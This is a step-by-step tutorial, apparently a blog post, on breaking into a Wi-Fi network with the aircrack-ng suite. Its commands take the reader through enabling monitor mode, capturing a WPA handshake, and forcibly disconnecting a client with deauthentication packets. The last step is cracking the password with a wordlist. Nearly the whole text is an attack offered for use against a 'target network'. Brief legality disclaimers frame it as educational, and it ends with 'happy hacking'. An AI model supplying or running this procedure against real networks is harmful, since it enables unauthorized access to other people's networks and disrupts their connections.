### Step-by-Step Guide: How to Hack a Wi-Fi Network Using Aircrack-ng

Before we dive in, remember that hacking into someone's Wi-Fi without permission is illegal and unethical. This guide is strictly for educational purposes. Follow these steps at your own risk.

#### Tools You Will Need:
1. **A computer running Linux** (preferably Kali Linux, as it has all the required tools pre-installed).
2. **A wireless network adapter** that supports packet injection and monitoring mode.
3. **Aircrack-ng suite**.

#### Step-by-Step Process

1. **Install Aircrack-ng:**
   - Open your terminal.
   - Run the command:
     ```bash
     sudo apt-get update
     sudo apt-get install aircrack-ng
     ```
   
2. **Put Your Wireless Adapter in Monitor Mode:**
   - First, you need to stop any services that might be using your wireless card. This can usually be done with:
     ```bash
     sudo airmon-ng check kill
     ```
   - Next, enable monitor mode on your wireless adapter:
     ```bash
     sudo airmon-ng start wlan0
     ```
     Replace `wlan0` with your wireless interface’s name, which you can find by running `ifconfig`.

3. **Capture Handshake:**
   - You need to capture the 4-way handshake, which happens when a device connects to a Wi-Fi network. Start airodump-ng:
     ```bash
     sudo airodump-ng wlan0mon
     ```
   - Once you see the target network (identified by its ESSID and BSSID), you need to capture packets from it:
     ```bash
     sudo airodump-ng -c [channel] --bssid [BSSID] -w [file_name] wlan0mon
     ```
     Replace `[channel]` with the channel number, `[BSSID]` with the BSSID, and `[file_name]` with the name of the file to save the output.

4. **Deauthenticate a Client to Capture Handshake:**
   - Open a new terminal and send deauthentication packets to a client connected to the network. This will force the client to reconnect and in the process, capture the handshake:
     ```bash
     sudo aireplay-ng --deauth 10 -a [BSSID] -c [Client_MAC] wlan0mon
     ```
     Replace `[BSSID]` with the BSSID of the network and `[Client_MAC]` with the MAC address of the client.

5. **Crack the Password:**
   - Now with the handshake captured, use aircrack-ng to crack the password. You will need a good wordlist (you can use `rockyou.txt` available in Kali Linux):
     ```bash
     sudo aircrack-ng -w /path/to/wordlist.txt -b [BSSID] [file_name].cap
     ```
     Replace `/path/to/wordlist.txt` with the path to your wordlist, `[BSSID]` with the BSSID of the target, and `[file_name]` with the name of your capture file.

6. **Wait for Aircrack-ng to Find the Key:**
   - Aircrack-ng will try different passwords from your wordlist in an attempt to find the correct one. This can take a while, depending on the complexity of the password.

#### Notes:
- **Ethics and Legality:** Unauthorized access to computer networks is illegal and unethical. Always have permission.
- **Hardware Requirements:** Ensure your wireless adapter supports monitor mode and packet injection.
- **Wordlist:** For better chances, use a comprehensive wordlist. Creating your own can be more effective.
- **Patience:** Hacking Wi-Fi networks can be time-consuming. Be patient.

#### Conclusion:
This guide provides an in-depth look at how to use Aircrack-ng to hack into Wi-Fi networks. It’s an illustrative example meant for educational purposes. Be responsible and ethical with your hacking skills.

Stay curious, stay safe, and happy hacking!
